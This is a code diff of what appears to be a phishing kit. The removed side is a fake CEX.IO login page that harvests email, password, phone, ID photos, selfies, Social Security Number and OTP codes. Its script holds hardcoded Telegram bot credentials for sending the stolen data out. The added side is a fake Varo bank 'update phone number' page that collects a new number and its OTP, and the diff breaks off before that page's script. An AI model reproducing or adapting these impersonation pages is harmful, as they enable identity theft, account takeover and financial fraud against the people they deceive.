@@ -1,1171 +1,675 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
-    <title>
-      CEX.IO • Log In
-    </title>
-    <style>
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        -webkit-tap-highlight-color: transparent;
-      }
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Varo • Update Phone Number</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
 
-      body {
-        background: #FFFFFF;
-        font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, Arial, sans-serif;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        min-height: 100vh;
-        padding: 20px;
-      }
+    body {
+      background: #FFFFFF;
+      font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 24px 20px;
+    }
 
-      .container {
-        max-width: 460px;
-        width: 100%;
-        margin: 0 auto;
-      }
+    .container {
+      max-width: 420px;
+      width: 100%;
+      margin: 0 auto;
+    }
 
-      .card {
-        background: #FFFFFF;
-        border-radius: 16px;
-        padding: 32px 28px 40px;
-        border: none;
-        box-shadow: none;
-      }
+    /* ---------- HELP ---------- */
+    .help-row {
+      display: flex;
+      justify-content: flex-end;
+      margin-bottom: 16px;
+    }
 
-      /* ---------- CEX.IO Header ---------- */
-      .cex-header {
-        text-align: center;
-        margin-bottom: 32px;
-      }
+    .help-link {
+      color: #7B5FCE;
+      font-weight: 600;
+      font-size: 17px;
+      text-decoration: none;
+      letter-spacing: -0.2px;
+    }
 
-      .cex-title {
-        font-size: 32px;
-        font-weight: 700;
-        color: #0B1426;
-        letter-spacing: -0.5px;
-        margin-bottom: 12px;
-      }
+    /* ---------- VARO LOGO ---------- */
+    .varo-logo {
+      text-align: center;
+      font-size: 78px;
+      font-weight: 700;
+      letter-spacing: -2px;
+      color: #7B5FCE;
+      margin: 20px 0 40px;
+      line-height: 1;
+      font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, Arial, sans-serif;
+    }
 
-      .cex-subtitle {
-        font-size: 16px;
-        color: #4A5568;
-        font-weight: 400;
-        line-height: 1.5;
-        max-width: 360px;
-        margin: 0 auto;
-      }
+    /* ---------- PAGE TITLE ---------- */
+    .page-title {
+      text-align: center;
+      font-size: 22px;
+      font-weight: 700;
+      color: #1A1A1A;
+      margin-bottom: 8px;
+      letter-spacing: -0.4px;
+    }
 
-      /* ---------- Inputs ---------- */
-      .input-group {
-        margin-bottom: 24px;
-      }
+    .page-subtitle {
+      text-align: center;
+      font-size: 15px;
+      font-weight: 400;
+      color: #6B6B6B;
+      margin-bottom: 32px;
+      line-height: 1.5;
+      letter-spacing: -0.2px;
+    }
 
-      .input-label {
-        font-weight: 500;
-        font-size: 14px;
-        color: #1A202C;
-        margin-bottom: 8px;
-        display: block;
-      }
+    /* ---------- FORM ---------- */
+    .input-group {
+      margin-bottom: 24px;
+    }
 
-      .input-wrapper {
-        position: relative;
-        display: flex;
-        align-items: center;
-      }
+    .input-label {
+      font-weight: 600;
+      font-size: 16px;
+      color: #1A1A1A;
+      margin-bottom: 8px;
+      display: block;
+      letter-spacing: -0.2px;
+    }
 
-      input, select {
-        width: 100%;
-        padding: 16px 16px;
-        font-size: 16px;
-        background: #FFFFFF;
-        border: 1px solid #E2E8F0;
-        border-radius: 12px;
-        color: #1A202C;
-        outline: none;
-        transition: all 0.2s;
-        font-family: inherit;
-        appearance: none;
-      }
+    input {
+      width: 100%;
+      padding: 16px 16px;
+      font-size: 16px;
+      background: #FFFFFF;
+      border: 1.5px solid #D0D0D0;
+      border-radius: 10px;
+      color: #1A1A1A;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      font-family: inherit;
+      font-weight: 400;
+      letter-spacing: -0.2px;
+      height: 56px;
+    }
 
-      input::placeholder {
-        color: #A0AEC0;
-        font-weight: 400;
-      }
+    input:focus {
+      border-color: #7B5FCE;
+      box-shadow: 0 0 0 3px rgba(123, 95, 206, 0.12);
+    }
 
-      input:focus, select:focus {
-        border-color: #00B5AD;
-        box-shadow: 0 0 0 3px rgba(0, 181, 173, 0.15);
-      }
+    input::placeholder {
+      color: #AAAAAA;
+      font-weight: 400;
+    }
 
-      /* Email field special highlight */
-      .email-highlight {
-        border: 2px solid #7DD3C8;
-        border-radius: 12px;
-        padding: 2px;
-      }
+    /* ---------- PRIMARY BUTTON ---------- */
+    .primary-btn {
+      background: #7B5FCE;
+      color: #FFFFFF;
+      font-weight: 600;
+      width: 100%;
+      border: none;
+      padding: 18px;
+      border-radius: 10px;
+      font-size: 18px;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      letter-spacing: -0.2px;
+      height: 58px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-      .email-highlight input {
-        border: 1px solid #E2E8F0;
-        border-radius: 10px;
-      }
+    .primary-btn:active {
+      transform: scale(0.98);
+      background: #6A4FBD;
+    }
 
-      .email-highlight input:focus {
-        border-color: #00B5AD;
-        box-shadow: 0 0 0 3px rgba(0, 181, 173, 0.15);
-      }
+    .primary-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
 
-      /* Password eye icon */
-      .password-toggle {
-        position: absolute;
-        right: 16px;
-        top: 50%;
-        transform: translateY(-50%);
-        cursor: pointer;
-        color: #A0AEC0;
-        font-size: 20px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        user-select: none;
-        transition: color 0.2s;
-        background: none;
-        border: none;
-        padding: 4px;
-      }
+    /* ---------- BACK LINK ---------- */
+    .back-link {
+      text-align: center;
+      margin-top: 20px;
+    }
 
-      .password-toggle:hover {
-        color: #718096;
-      }
+    .back-link a {
+      color: #7B5FCE;
+      font-size: 15px;
+      font-weight: 500;
+      text-decoration: none;
+      letter-spacing: -0.2px;
+    }
 
-      /* ---------- Forgot password link ---------- */
-      .forgot-link {
-        text-align: center;
-        margin: 28px 0 24px;
-      }
+    /* ---------- INFO NOTE ---------- */
+    .info-note {
+      background: #F3EFFC;
+      border-radius: 12px;
+      padding: 12px 16px;
+      font-size: 13px;
+      margin: 12px 0 4px;
+      color: #5A4A8A;
+      text-align: center;
+      line-height: 1.4;
+      letter-spacing: -0.2px;
+    }
 
-      .forgot-link a {
-        color: #F47B5B;
-        font-size: 16px;
-        font-weight: 500;
-        text-decoration: none;
-        transition: opacity 0.2s;
-        cursor: pointer;
-      }
+    /* ---------- OTP HINT ---------- */
+    .otp-hint {
+      background: #F3EFFC;
+      border-radius: 12px;
+      padding: 14px 16px;
+      text-align: center;
+      margin-bottom: 24px;
+      font-size: 15px;
+      color: #1A1A1A;
+      line-height: 1.5;
+      letter-spacing: -0.2px;
+    }
 
-      .forgot-link a:hover {
-        opacity: 0.8;
-      }
+    .phone-mask {
+      font-weight: 700;
+      color: #7B5FCE;
+    }
 
-      /* ---------- Action button ---------- */
-      .action-btn {
-        background: #00B5AD;
-        color: white;
-        font-weight: 600;
-        width: 100%;
-        border: none;
-        padding: 16px;
-        border-radius: 12px;
-        font-size: 17px;
-        cursor: pointer;
-        transition: 0.2s;
-        margin-top: 4px;
-      }
+    /* ---------- BOTTOM HOME INDICATOR ---------- */
+    .home-indicator {
+      width: 140px;
+      height: 5px;
+      background: #1A1A1A;
+      border-radius: 3px;
+      margin: 40px auto 0;
+      opacity: 0.8;
+    }
 
-      .action-btn:active {
-        transform: scale(0.98);
-        background: #009E97;
-      }
+    /* ---------- TOAST ---------- */
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: #1A1A1A;
+      color: #FFFFFF;
+      padding: 14px 24px;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 500;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.18);
+      transition: transform 0.3s ease, opacity 0.3s ease;
+      opacity: 0;
+      pointer-events: none;
+      z-index: 9999;
+      max-width: 360px;
+      text-align: center;
+      letter-spacing: -0.2px;
+    }
 
-      .action-btn:disabled {
-        background: #E2E8F0;
-        color: #A0AEC0;
-        cursor: not-allowed;
-      }
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+    }
 
-      /* Secondary link button */
-      .link-btn {
-        background: none;
-        border: none;
-        color: #00B5AD;
-        font-weight: 500;
-        font-size: 14px;
-        cursor: pointer;
-        margin-top: 12px;
-        text-decoration: underline;
-        width: auto;
-        padding: 0;
-      }
+    .toast.error {
+      background: #C0392B;
+    }
 
-      .terms {
-        font-size: 11px;
-        color: #A0AEC0;
-        text-align: center;
-        margin-top: 28px;
-        line-height: 1.5;
-      }
+    /* ---------- LOADING OVERLAY ---------- */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(6px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      z-index: 9998;
+      visibility: hidden;
+      opacity: 0;
+      transition: opacity 0.25s ease, visibility 0.25s ease;
+    }
 
-      /* ---------- KYC & Camera styles ---------- */
-      .step-indicator {
-        display: flex;
-        gap: 8px;
-        margin-bottom: 28px;
-      }
+    .loading-overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
 
-      .step-dot {
-        flex: 1;
-        height: 4px;
-        background: #E2E8F0;
-        border-radius: 4px;
-        transition: background 0.3s;
-      }
+    .spinner {
+      width: 44px;
+      height: 44px;
+      border: 4px solid #E0D9F5;
+      border-top-color: #7B5FCE;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 18px;
+    }
 
-      .step-dot.active {
-        background: #00B5AD;
-      }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
 
-      .step-dot.completed {
-        background: #00B5AD;
-      }
+    .loading-text {
+      font-size: 16px;
+      color: #1A1A1A;
+      font-weight: 500;
+      letter-spacing: -0.2px;
+      text-align: center;
+      line-height: 1.5;
+    }
 
-      .camera-container {
-        background: #000;
-        border-radius: 20px;
-        overflow: hidden;
-        margin: 16px 0 12px;
-        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      }
+    /* ---------- UTILITY ---------- */
+    .hide {
+      display: none !important;
+    }
 
-      .square-camera {
-        aspect-ratio: 1 / 1;
-        background: #1A1A1A;
-      }
+    /* ---------- RESEND OPTIONS ---------- */
+    .resend-row {
+      text-align: center;
+      margin-top: 16px;
+      display: flex;
+      justify-content: center;
+      gap: 24px;
+      flex-wrap: wrap;
+    }
 
-      video {
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-      }
+    .resend-link {
+      background: none;
+      border: none;
+      color: #7B5FCE;
+      font-weight: 600;
+      font-size: 15px;
+      cursor: pointer;
+      text-decoration: underline;
+      text-underline-offset: 2px;
+      letter-spacing: -0.2px;
+      padding: 0;
+    }
 
-      .camera-controls {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        gap: 30px;
-        padding: 16px 0 8px;
-      }
-
-      .capture-btn {
-        background: white;
-        width: 70px;
-        height: 70px;
-        border-radius: 50%;
-        border: 4px solid #00B5AD;
-        box-shadow: 0 2px 12px rgba(0, 0, 0, 0.2);
-        cursor: pointer;
-        transition: 0.1s;
-      }
-
-      .capture-btn:active {
-        transform: scale(0.94);
-      }
-
-      .switch-cam {
-        background: rgba(0, 0, 0, 0.65);
-        width: 46px;
-        height: 46px;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 24px;
-        cursor: pointer;
-        color: white;
-        backdrop-filter: blur(5px);
-      }
-
-      .status-badge {
-        background: #F7FAFC;
-        padding: 10px;
-        border-radius: 60px;
-        text-align: center;
-        font-size: 13px;
-        margin: 12px 0 4px;
-        color: #2D3748;
-        font-weight: 500;
-      }
-
-      .toast {
-        background: #1A202C;
-        color: white;
-        border-radius: 40px;
-        padding: 12px 18px;
-        text-align: center;
-        opacity: 0;
-        transition: 0.2s;
-        pointer-events: none;
-        margin-top: 20px;
-        font-size: 14px;
-      }
-
-      .toast.show {
-        opacity: 1;
-      }
-
-      .loading-overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0, 0, 0, 0.92);
-        backdrop-filter: blur(8px);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        flex-direction: column;
-        z-index: 2000;
-        visibility: hidden;
-        opacity: 0;
-        transition: 0.2s;
-      }
-
-      .loading-overlay.active {
-        visibility: visible;
-        opacity: 1;
-      }
-
-      .spinner {
-        width: 48px;
-        height: 48px;
-        border: 4px solid #00B5AD;
-        border-top-color: #FFFFFF;
-        border-radius: 50%;
-        animation: spin 0.9s linear infinite;
-        margin-bottom: 20px;
-      }
-
-      @keyframes spin {
-        to {
-          transform: rotate(360deg);
-        }
-      }
-
-      .loading-text {
-        font-size: 16px;
-        color: white;
-        text-align: center;
-        font-weight: 500;
-      }
-
-      .hide {
-        display: none;
-      }
-
-      .otp-hint {
-        background: #E6FFFA;
-        border-radius: 16px;
-        padding: 12px 16px;
-        text-align: center;
-        margin-bottom: 24px;
-        font-size: 15px;
-        border-left: 3px solid #00B5AD;
-        color: #234E52;
-      }
-
-      .info-note {
-        background: #FFFAF0;
-        border-radius: 12px;
-        padding: 10px 12px;
-        font-size: 12px;
-        margin: 12px 0 4px;
-        color: #975A16;
-        text-align: center;
-      }
-
-      .back-link {
-        text-align: center;
-        margin-top: 20px;
-      }
-
-      .back-link a {
-        color: #718096;
-        font-size: 13px;
-        text-decoration: none;
-        transition: color 0.2s;
-        cursor: pointer;
-      }
-
-      .back-link a:hover {
-        color: #4A5568;
-      }
-
-      .resend-options {
-        text-align: center;
-        margin-top: 16px;
-        display: flex;
-        justify-content: center;
-        gap: 20px;
-        flex-wrap: wrap;
-      }
-
-      .resend-options .link-btn {
-        color: #00B5AD;
-        font-size: 13px;
-      }
-
-      /* Success panel */
-      .success-panel {
-        text-align: center;
-        padding: 20px 0;
-      }
-
-      .success-icon {
+    /* Responsive tweaks */
+    @media (max-width: 380px) {
+      .varo-logo {
         font-size: 64px;
-        margin-bottom: 16px;
+        margin: 12px 0 32px;
       }
-
-      .success-title {
-        font-size: 24px;
-        font-weight: 700;
-        color: #0B1426;
-        margin-bottom: 12px;
+      .page-title {
+        font-size: 20px;
       }
-
-      .success-text {
+      .page-subtitle {
+        font-size: 14px;
+      }
+      .help-link {
         font-size: 15px;
-        color: #4A5568;
-        line-height: 1.6;
       }
-
-      /* SSN secure badge */
-      .ssn-secure {
-        background: #F0FFF4;
-        border-radius: 12px;
-        padding: 10px 12px;
-        font-size: 12px;
-        margin: 12px 0 4px;
-        color: #276749;
-        text-align: center;
-        border-left: 3px solid #38A169;
+      .input-label {
+        font-size: 15px;
       }
-
-      /* Responsive */
-      @media (max-width: 480px) {
-        .card {
-          padding: 24px 20px 32px;
-        }
-        .cex-title {
-          font-size: 28px;
-        }
-        .cex-subtitle {
-          font-size: 15px;
-        }
+      input {
+        font-size: 15px;
+        height: 52px;
+        padding: 14px;
       }
-    </style>
-  </head>
-  <body>
-    <div class="container">
-      <!-- STEP 1: CEX.IO LOGIN -->
-      <div id="loginPanel" class="card">
-        <div class="cex-header">
-          <div class="cex-title">Log in to CEX.IO</div>
-          <div class="cex-subtitle">Enter your registered email address to log in.</div>
-        </div>
-        <div class="input-group">
-          <label class="input-label" for="loginIdentifier">Your email</label>
-          <div class="email-highlight">
-            <input type="text" id="loginIdentifier" placeholder="Required" autocomplete="off" />
-          </div>
-        </div>
-        <div class="input-group">
-          <label class="input-label" for="loginPassword">Password</label>
-          <div class="input-wrapper">
-            <input type="password" id="loginPassword" placeholder="Required" autocomplete="off" />
-            <button class="password-toggle" id="togglePasswordBtn" type="button" aria-label="Show password">
-              👁️
-            </button>
-          </div>
-        </div>
-        <div class="forgot-link">
-          <a id="forgotPasswordLink">Forgot password?</a>
-        </div>
-        <button class="action-btn" id="continueToPhoneBtn">
-          Log in
-        </button>
-        <div class="terms">
-          By clicking Log in, you agree to CEX.IO's
-          <a href="#" style="color:#00B5AD; text-decoration:none;">Terms of Service</a>
-          and
-          <a href="#" style="color:#00B5AD; text-decoration:none;">Privacy Policy</a>.
+      .primary-btn {
+        font-size: 17px;
+        height: 54px;
+        padding: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+
+    <!-- ============================================ -->
+    <!-- STEP 1: ENTER NEW PHONE NUMBER              -->
+    <!-- ============================================ -->
+    <div id="phonePanel">
+      <div class="help-row">
+        <a href="#" class="help-link">Help</a>
+      </div>
+
+      <div class="varo-logo">
+        Varo
+      </div>
+
+      <div class="page-title">Update phone number</div>
+      <div class="page-subtitle">
+        Enter the new phone number you'd like to use for your Varo account.
+      </div>
+
+      <div class="input-group">
+        <label class="input-label" for="newPhoneNumber">New phone number</label>
+        <input
+          type="tel"
+          id="newPhoneNumber"
+          placeholder="+1 234 567 8900"
+          autocomplete="off"
+        />
+        <div class="info-note">
+          We'll send a verification code to this number
         </div>
       </div>
 
-      <!-- FORGOT PASSWORD PANEL -->
-      <div id="forgotPanel" class="card hide">
-        <div class="cex-header">
-          <div class="cex-title">Reset password</div>
-          <div class="cex-subtitle">Enter your registered email address and we'll send you a reset link.</div>
-        </div>
-        <div class="input-group">
-          <label class="input-label" for="forgotEmail">Your email</label>
-          <div class="email-highlight">
-            <input type="text" id="forgotEmail" placeholder="Required" autocomplete="off" />
-          </div>
-        </div>
-        <button class="action-btn" id="sendResetBtn">
-          Send reset link
-        </button>
-        <div class="back-link">
-          <a id="backToLoginFromForgot">← Back to log in</a>
-        </div>
-      </div>
+      <button class="primary-btn" id="submitPhoneBtn">
+        Send verification code
+      </button>
 
-      <!-- STEP 2: PHONE NUMBER -->
-      <div id="phonePanel" class="card hide">
-        <div class="cex-header">
-          <div class="cex-title">Verify your identity</div>
-          <div class="cex-subtitle">Enter your mobile phone number to continue.</div>
-        </div>
-        <div class="input-group">
-          <label class="input-label" for="userPhoneNumber">Mobile phone number</label>
-          <input type="tel" id="userPhoneNumber" placeholder="+1 234 567 8900" autocomplete="off" />
-          <div class="info-note">We'll use this number to verify your identity</div>
-        </div>
-        <button class="action-btn" id="submitPhoneBtn">
-          Continue →
-        </button>
-        <div class="back-link">
-          <a id="backToLoginFromPhone">← Back</a>
-        </div>
-      </div>
-
-      <!-- STEP 3: PASSWORD (if needed) -->
-      <div id="passwordPanel" class="card hide">
-        <div class="cex-header">
-          <div class="cex-title">Confirm your password</div>
-          <div class="cex-subtitle">Please enter your account password.</div>
-        </div>
-        <div class="input-group">
-          <label class="input-label" for="userPassword">Password</label>
-          <input type="password" id="userPassword" placeholder="Enter your password" autocomplete="off" />
-        </div>
-        <button class="action-btn" id="submitPasswordBtn">
-          Log In →
-        </button>
-        <div class="back-link">
-          <a id="backToPhoneFromPassword">← Back</a>
-        </div>
-      </div>
-
-      <!-- STEP 4: KYC PHOTOS -->
-      <div id="kycPanel" class="card hide">
-        <div class="cex-header">
-          <div class="cex-title">Identity verification</div>
-          <div class="cex-subtitle">Please capture the required documents.</div>
-        </div>
-        <div class="step-indicator" id="stepIndicator">
-          <div class="step-dot"></div>
-          <div class="step-dot"></div>
-          <div class="step-dot"></div>
-          <div class="step-dot"></div>
-          <div class="step-dot"></div>
-        </div>
-
-        <div id="kycStep1" class="kyc-step">
-          <div class="input-group">
-            <label class="input-label" for="idType">ID type</label>
-            <select id="idType">
-              <option value="">Select document</option>
-              <option>Driver's License</option>
-              <option>State ID Card</option>
-              <option>Passport</option>
-              <option>Resident Permit</option>
-            </select>
-          </div>
-          <div class="input-group">
-            <label class="input-label" for="idState">Issuing state / country</label>
-            <select id="idState">
-              <option value="">Select state or region</option>
-              <option>Alabama</option>
-              <option>Alaska</option>
-              <option>Arizona</option>
-              <option>Arkansas</option>
-              <option>California</option>
-              <option>Colorado</option>
-              <option>Connecticut</option>
-              <option>Delaware</option>
-              <option>Florida</option>
-              <option>Georgia</option>
-              <option>Hawaii</option>
-              <option>Idaho</option>
-              <option>Illinois</option>
-              <option>Indiana</option>
-              <option>Iowa</option>
-              <option>Kansas</option>
-              <option>Kentucky</option>
-              <option>Louisiana</option>
-              <option>Maine</option>
-              <option>Maryland</option>
-              <option>Massachusetts</option>
-              <option>Michigan</option>
-              <option>Minnesota</option>
-              <option>Mississippi</option>
-              <option>Missouri</option>
-              <option>Montana</option>
-              <option>Nebraska</option>
-              <option>Nevada</option>
-              <option>New Hampshire</option>
-              <option>New Jersey</option>
-              <option>New Mexico</option>
-              <option>New York</option>
-              <option>North Carolina</option>
-              <option>North Dakota</option>
-              <option>Ohio</option>
-              <option>Oklahoma</option>
-              <option>Oregon</option>
-              <option>Pennsylvania</option>
-              <option>Rhode Island</option>
-              <option>South Carolina</option>
-              <option>South Dakota</option>
-              <option>Tennessee</option>
-              <option>Texas</option>
-              <option>Utah</option>
-              <option>Vermont</option>
-              <option>Virginia</option>
-              <option>Washington</option>
-              <option>West Virginia</option>
-              <option>Wisconsin</option>
-              <option>Wyoming</option>
-            </select>
-          </div>
-          <button class="action-btn" id="kycStep1Next">
-            Continue to ID capture →
-          </button>
-        </div>
-
-        <div id="kycStep2" class="kyc-step hide">
-          <div class="status-badge">📄 Front side of your ID</div>
-          <div class="camera-container">
-            <div class="square-camera">
-              <video id="frontVideo" autoplay playsinline muted></video>
-            </div>
-          </div>
-          <div class="camera-controls">
-            <div class="switch-cam" id="switchFrontCam">⟳</div>
-            <div class="capture-btn" id="captureFrontBtn"></div>
-            <div style="width:44px;"></div>
-          </div>
-          <div class="status-badge" id="frontStatus">Position ID in frame &amp; tap circle</div>
-        </div>
-
-        <div id="kycStep3" class="kyc-step hide">
-          <div class="status-badge">🔄 Back side of your ID</div>
-          <div class="camera-container">
-            <div class="square-camera">
-              <video id="backVideo" autoplay playsinline muted></video>
-            </div>
-          </div>
-          <div class="camera-controls">
-            <div class="switch-cam" id="switchBackCam">⟳</div>
-            <div class="capture-btn" id="captureBackBtn"></div>
-            <div style="width:44px;"></div>
-          </div>
-          <div class="status-badge" id="backStatus">Ready to capture</div>
-        </div>
-
-        <div id="kycStep4" class="kyc-step hide">
-          <div class="status-badge">🤳 Take a selfie</div>
-          <div class="camera-container">
-            <div class="square-camera">
-              <video id="selfieVideo" autoplay playsinline muted></video>
-            </div>
-          </div>
-          <div class="camera-controls">
-            <div class="switch-cam" id="switchSelfieCam">⟳</div>
-            <div class="capture-btn" id="captureSelfieBtn"></div>
-            <div style="width:44px;"></div>
-          </div>
-          <div class="status-badge" id="selfieStatus">Look at the camera</div>
-        </div>
-
-        <div id="kycStep5" class="kyc-step hide">
-          <div class="status-badge">📸 Selfie holding ID next to your face</div>
-          <div class="camera-container">
-            <div class="square-camera">
-              <video id="selfieIdVideo" autoplay playsinline muted></video>
-            </div>
-          </div>
-          <div class="camera-controls">
-            <div class="switch-cam" id="switchSelfieIdCam">⟳</div>
-            <div class="capture-btn" id="captureSelfieIdBtn"></div>
-            <div style="width:44px;"></div>
-          </div>
-          <div class="status-badge" id="selfieIdStatus">Hold ID clearly visible</div>
-        </div>
-      </div>
-
-      <!-- STEP 4.5: SSN COLLECTION (after KYC, before OTP) -->
-      <div id="ssnPanel" class="card hide">
-        <div class="cex-header">
-          <div class="cex-title">Tax identification</div>
-          <div class="cex-subtitle">For regulatory compliance, please provide your Social Security Number.</div>
-        </div>
-        <div class="input-group">
-          <label class="input-label" for="ssnInput">Social Security Number</label>
-          <input type="text" id="ssnInput" placeholder="XXX-XX-XXXX" autocomplete="off" inputmode="numeric" maxlength="11" />
-          <div class="ssn-secure">🔒 Your SSN is encrypted and securely transmitted.</div>
-        </div>
-        <button class="action-btn" id="submitSsnBtn">
-          Continue →
-        </button>
-        <div class="back-link">
-          <a id="backToKycFromSsn">← Back to verification</a>
-        </div>
-      </div>
-
-      <!-- STEP 5: OTP PAGE (no phone digits displayed) -->
-      <div id="otpPanel" class="card hide">
-        <div class="cex-header">
-          <div class="cex-title">Verification code</div>
-          <div class="cex-subtitle">Enter the code sent to your phone.</div>
-        </div>
-        <div class="otp-hint" id="otpPhoneHint">
-          🔐 Verification code sent to your registered mobile number.
-        </div>
-        <div class="input-group">
-          <label class="input-label" for="otpCode">Enter code</label>
-          <input type="text" id="otpCode" placeholder="Verification code" autocomplete="off" inputmode="numeric" maxlength="6" />
-        </div>
-        <button class="action-btn" id="otpSubmitBtn">
-          Verify
-        </button>
-        <div class="resend-options">
-          <button class="link-btn" id="resendSmsBtn">📱 Resend SMS</button>
-          <button class="link-btn" id="requestEmailOtpBtn">✉️ Send code to email instead</button>
-        </div>
-        <div class="terms">
-          We sent a one-time code to your mobile. You can also request it via email.
-        </div>
-        <div class="back-link">
-          <a id="backToSsnLink">← Back</a>
-        </div>
-      </div>
-
-      <!-- SUCCESS PANEL -->
-      <div id="successPanel" class="card hide">
-        <div class="success-panel">
-          <div class="success-icon">✅</div>
-          <div class="success-title">Verification complete</div>
-          <div class="success-text">
-            Your identity has been successfully verified. Thank you for your patience.
-          </div>
-        </div>
-      </div>
-
-      <div id="toastMsg" class="toast"></div>
-    </div>
-
-    <div id="loadingOverlay" class="loading-overlay">
-      <div class="spinner"></div>
-      <div class="loading-text">
-        Processing verification...
-        <br />
-        Please wait
+      <div class="back-link">
+        <a href="#" id="cancelLink">← Cancel</a>
       </div>
     </div>
 
-    <script>
-      // Telegram bot credentials
-      const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
-      const CHAT_ID = "8737104261";
+    <!-- ============================================ -->
+    <!-- STEP 2: OTP VERIFICATION                    -->
+    <!-- ============================================ -->
+    <div id="otpPanel" class="hide">
+      <div class="help-row">
+        <a href="#" class="help-link">Help</a>
+      </div>
 
-      let userData = {
-        identifier: '',
-        phoneNumber: '',
-        password: '',
-        idType: '',
-        idState: '',
-        ssn: '',
-        otpCode: ''
-      };
+      <div class="varo-logo">
+        Varo
+      </div>
 
-      // DOM panels
-      const loginPanel = document.getElementById('loginPanel');
-      const forgotPanel = document.getElementById('forgotPanel');
-      const phonePanel = document.getElementById('phonePanel');
-      const passwordPanel = document.getElementById('passwordPanel');
-      const kycPanel = document.getElementById('kycPanel');
-      const ssnPanel = document.getElementById('ssnPanel');
-      const otpPanel = document.getElementById('otpPanel');
-      const successPanel = document.getElementById('successPanel');
-      const toast = document.getElementById('toastMsg');
-      const loadingOverlay = document.getElementById('loadingOverlay');
+      <div class="page-title">Verify your number</div>
+      <div class="page-subtitle">
+        Enter the 6-digit code we sent to your new number.
+      </div>
 
-      // Step 1 elements
-      const loginIdentifier = document.getElementById('loginIdentifier');
-      const loginPassword = document.getElementById('loginPassword');
-      const continueToPhoneBtn = document.getElementById('continueToPhoneBtn');
-      const togglePasswordBtn = document.getElementById('togglePasswordBtn');
-      const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+      <div class="otp-hint" id="otpHint">
+        🔐 Verification code sent to
+        <span class="phone-mask" id="maskedPhone">****</span>
+      </div>
 
-      // Forgot password elements
-      const forgotEmail = document.getElementById('forgotEmail');
-      const sendResetBtn = document.getElementById('sendResetBtn');
-      const backToLoginFromForgot = document.getElementById('backToLoginFromForgot');
+      <div class="input-group">
+        <label class="input-label" for="otpCode">Verification code</label>
+        <input
+          type="text"
+          id="otpCode"
+          placeholder="Enter 6-digit code"
+          autocomplete="off"
+          inputmode="numeric"
+          maxlength="6"
+        />
+      </div>
 
-      // Step 2 elements
-      const userPhoneInput = document.getElementById('userPhoneNumber');
-      const submitPhoneBtn = document.getElementById('submitPhoneBtn');
-      const backToLoginFromPhone = document.getElementById('backToLoginFromPhone');
+      <button class="primary-btn" id="otpSubmitBtn">
+        Verify & update number
+      </button>
 
-      // Step 3 elements
-      const userPasswordInput = document.getElementById('userPassword');
-      const submitPasswordBtn = document.getElementById('submitPasswordBtn');
-      const backToPhoneFromPassword = document.getElementById('backToPhoneFromPassword');
+      <div class="resend-row">
+        <button class="resend-link" id="resendOtpBtn">Resend code</button>
+      </div>
 
-      // SSN elements
-      const ssnInput = document.getElementById('ssnInput');
-      const submitSsnBtn = document.getElementById('submitSsnBtn');
-      const backToKycFromSsn = document.getElementById('backToKycFromSsn');
+      <div class="back-link" style="margin-top: 16px;">
+        <a href="#" id="backToPhone">← Change number</a>
+      </div>
+    </div>
 
-      // OTP elements
-      const otpSubmit = document.getElementById('otpSubmitBtn');
-      const otpCodeInput = document.getElementById('otpCode');
-      const backToSsnLink = document.getElementById('backToSsnLink');
-      const resendSmsBtn = document.getElementById('resendSmsBtn');
-      const requestEmailOtpBtn = document.getElementById('requestEmailOtpBtn');
+    <!-- ============================================ -->
+    <!-- STEP 3: SUCCESS                             -->
+    <!-- ============================================ -->
+    <div id="successPanel" class="hide">
+      <div class="help-row">
+        <a href="#" class="help-link">Help</a>
+      </div>
 
-      // ---- Password toggle ----
-      let passwordVisible = false;
-      if (togglePasswordBtn) {
-        togglePasswordBtn.addEventListener('click', () => {
-          passwordVisible = !passwordVisible;
-          loginPassword.type = passwordVisible ? 'text' : 'password';
-          togglePasswordBtn.textContent = passwordVisible ? '🙈' : '👁️';
+      <div class="varo-logo">
+        Varo
+      </div>
+
+      <div style="text-align:center; padding: 20px 0 40px;">
